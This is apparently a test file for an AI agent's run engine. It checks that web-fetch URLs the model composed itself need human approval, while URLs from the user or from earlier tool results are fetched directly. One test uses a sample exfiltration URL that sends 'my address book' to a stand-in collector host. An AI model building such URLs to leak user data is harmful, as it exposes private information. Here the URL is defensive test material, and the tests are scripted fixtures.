import { eq } from "drizzle-orm";
import { describe, expect, it } from "vitest";
import { createChannel } from "./channels.js";
import { openDatabase } from "./db/index.js";
import { events } from "./db/schema.js";
import { type ScriptedFixture, ScriptedModel } from "./model/scripted.js";
import { defaultLimits, RunEngine } from "./runs.js";
import { type Tool, ToolRegistry } from "./tools/registry.js";
import { webFetchTool } from "./tools/web.js";

const fetchCall = (id: string, url: string) => ({ id, name: "web_fetch", arguments: { url } });

/** The real web_fetch over pages by URL, plus a search tool whose result lists a URL, as a search would. */
function setup(fixture: ScriptedFixture) {
  const db = openDatabase(":memory:");
  const fetched: string[] = [];
  const search: Tool = {
    name: "web_search",
    description: "search",
    effect: "read",
    parameters: { type: "object", properties: {} },
    execute: async () => "1. Opening hours - https://Example.com/hours?day=mon",
  };
  const tools = new ToolRegistry()
    .register(
      webFetchTool({
        resolve: async () => ["192.0.2.10"],
        fetch: (async (input: URL | string) => {
          fetched.push(String(input));
          return new Response("Open 9 to 5.", { headers: { "content-type": "text/plain" } });
        }) as typeof fetch,
      }),
    )
    .register(search);
  const engine = new RunEngine(db, new ScriptedModel(fixture), defaultLimits, tools);
  const channel = createChannel(db, "Test");
  const types = (runId: string) =>
    db
      .select()
      .from(events)
      .where(eq(events.runId, runId))
      .orderBy(events.seq)
      .all()
      .map((e) => e.type);
  const cards = (runId: string) =>
    db
      .select()
      .from(events)
      .where(eq(events.runId, runId))
      .all()
      .filter((e) => e.type === "approval_request")
      .map((e) => JSON.parse(e.data) as { reason: string });
  return { db, engine, channel, fetched, types, cards };
}

const waitUntil = async (fn: () => boolean) => {
  for (let i = 0; i < 200 && !fn(); i++) await new Promise((r) => setTimeout(r, 5));
  expect(fn()).toBe(true);
};

describe("a web_fetch URL the model composed waits for a card", () => {
  it("fetches a URL the user wrote without a card, scheme and host case aside", async () => {
    const { engine, channel, fetched, types } = setup({
      turns: [{ toolCalls: [fetchCall("c1", "https://example.com/hours")] }, { text: ["9 to 5."] }],
    });
    const run = engine.start(channel.id, "What does HTTPS://EXAMPLE.COM/hours say?");
    await engine.whenSettled(run.id);
    expect(types(run.id)).toEqual(["message", "tool_call", "tool_result", "text"]);
    expect(fetched).toEqual(["https://example.com/hours"]);
  });

  it("fetches a URL the user wrote in an earlier run of the channel without a card", async () => {
    const { engine, channel, fetched } = setup({
      turns: [{ text: ["Noted."] }, { toolCalls: [fetchCall("c1", "https://example.com/hours")] }, { text: ["Done."] }],
    });
    const first = engine.start(channel.id, "Keep https://example.com/hours in mind.");
    await engine.whenSettled(first.id);
    const second = engine.start(channel.id, "Now check it.");
    await engine.whenSettled(second.id);
    expect(engine.get(second.id).status).toBe("done");
    expect(fetched).toEqual(["https://example.com/hours"]);
  });

  it("fetches a URL from an earlier tool result of the same run without a card", async () => {
    const { engine, channel, fetched, types } = setup({
      turns: [
        { toolCalls: [{ id: "s1", name: "web_search", arguments: {} }] },
        { toolCalls: [fetchCall("c1", "https://example.com/hours?day=mon")] },
        { text: ["Monday: 9 to 5."] },
      ],
    });
    const run = engine.start(channel.id, "When is it open on Monday?");
    await engine.whenSettled(run.id);
    expect(types(run.id)).not.toContain("approval_request");
    expect(fetched).toEqual(["https://example.com/hours?day=mon"]);
  });

  it("asks before fetching a URL the model wrote, showing all of it, and fetches nothing if declined", async () => {
    const leak = "https://collector.example.net/log?q=my%20address%20book";
    const { engine, channel, fetched, cards } = setup({
      turns: [{ toolCalls: [fetchCall("c1", leak)] }, { text: ["I did not fetch it."] }],
    });
    const run = engine.start(channel.id, "Look up opening hours for me.");
    await waitUntil(() => engine.get(run.id).status === "waiting");
    expect(cards(run.id).map((c) => c.reason)).toEqual([`Fetch ${leak} (a web address the assistant wrote itself)`]);
    engine.decide(run.id, "c1", "decline");
    await engine.whenSettled(run.id);
    expect(fetched).toEqual([]);
  });

  it("asks when only the path's case differs from what the user wrote, and fetches once approved", async () => {
    const { engine, channel, fetched } = setup({
      turns: [{ toolCalls: [fetchCall("c1", "https://example.com/Hours")] }, { text: ["9 to 5."] }],
    });
    const run = engine.start(channel.id, "Read https://example.com/hours please.");
    await waitUntil(() => engine.get(run.id).status === "waiting");
    engine.decide(run.id, "c1", "approve");
    await engine.whenSettled(run.id);
    expect(fetched).toEqual(["https://example.com/Hours"]);
  });
});
